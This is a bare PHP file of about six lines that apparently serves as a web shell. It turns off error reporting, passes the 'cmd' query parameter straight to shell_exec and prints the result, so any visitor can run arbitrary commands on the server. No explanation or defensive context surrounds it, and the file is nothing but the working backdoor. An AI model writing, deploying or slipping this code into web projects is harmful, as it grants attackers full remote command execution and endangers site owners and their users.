<?
@error_reporting(0);
if(isset($_GET['cmd'])) {
    echo @shell_exec($_GET['cmd']);
    exit;
}
?>
